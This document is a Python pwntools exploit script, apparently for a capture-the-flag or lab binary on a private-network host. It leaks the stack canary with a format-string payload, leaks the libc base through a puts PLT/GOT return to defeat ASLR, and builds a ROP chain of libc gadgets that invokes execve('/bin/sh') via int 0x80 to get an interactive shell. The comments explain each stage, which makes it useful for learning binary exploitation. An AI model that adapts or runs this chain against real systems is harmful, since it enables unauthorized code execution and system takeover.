#!/usr/bin/env python3

from pwn import *

exe = ELF("main_patched")
libc = ELF("libc.so.6")
#ld = ELF("ld-linux.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("192.168.1.150", 5555)

    return r


def main():
    r = conn()
    input()

    print(r.recvline())

    # Canary leak (1st payload)
    # Canary is after the local variables of main, which we can check with gdb and 
    # see that esp gets subtracted by 112 bytes which means thats the size of all 
    # the local variables, so 112/4 = 28 words so it will be the 28th arg
    payload = "%23$X" 
    r.sendline(payload)

    # print is at 0x65f5b2c2
    data = r.recvline()
    print(data)
    canary = data[7:15]
    print(b'Canary: ' + canary)

    canary = p32(int(canary, 16), endianness = 'little')

    ###########################################################################

    #Layout
    # eax <- 0x0b 
    # ebx <- '/bin/sh'
    # ecx <- NULL 
    # edx <- NULL 

    # ASLR bypass
    # libc base address leak (second payload)
    # return to PLT entry of puts function, which contains a JMP to the 
    # actual puts address
    # the second address is the main function, which will be the return address 
    # for when the called puts will return, so after the puts is called and it 
    # leaks the address, the execution returns to the start again (to the main)  
    # and another payload is then sent 
    # the third address is the GOT entry of the puts function which is the actual 
    # location of the puts in memory (we know that the GOT address is there because we previusly called the puts function, so the procedure to fetch the GOT address has been already called) which is passed as argument to previously called puts
    payload = b'a'* 32 + canary + b'a'*12 + p32(exe.plt["puts"]) + p32(exe.symbols["main"]) + p32(exe.got["puts"])
    print(b'payload = ' + payload)
    print('puts@plt: ' + hex(exe.plt["puts"]))
    print('main: ' + hex(exe.symbols["main"]))
    r.sendline(payload)
    data = r.recvline()
    print(data)
    leak = r.recv(39)
    leak = r.recv(4)
    print(b"leak: " + leak)
    print("libc address: " + hex(u32(leak) - libc.symbols["puts"]))
    # setting the libc address
    libc_a = u32(leak) - libc.symbols["puts"]

    #Gadgets

    pop_ecx_eax = p32(0x00106910+libc_a, endianness = 'little')# pop ecx; pop eax; ret;
    pop_ebx = p32(0x00170e27+libc_a, endianness = 'little')    # pop ebx; ret;
    pop_edx = p32(0x00030ea4+libc_a, endianness = 'little')    # pop edx; ret;
    int_0x80 = p32(0x001693b2+libc_a, endianness = 'little')   # int 0x80;

    zero = p32(0, endianness = 'little')
    tmp = 11
    syscall_id = tmp.to_bytes(4, 'little')
    syscall_id = p32(11, endianness = 'little')
    string = next(libc.search(b"/bin/sh"))+libc_a
    bin_sh = p32(string, endianness = 'little')

    print(b'syscall_id = ' + syscall_id)
    print('bin_sh is at ' + hex(string))

    print(r.recvuntil("here"))

    #######################################################################

    # shell spawn via rop (third payload)
    payload = b'a'* 32 + canary + b'a'*12 + pop_ecx_eax + zero + syscall_id + pop_ebx + bin_sh + pop_edx + zero + int_0x80   

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
    

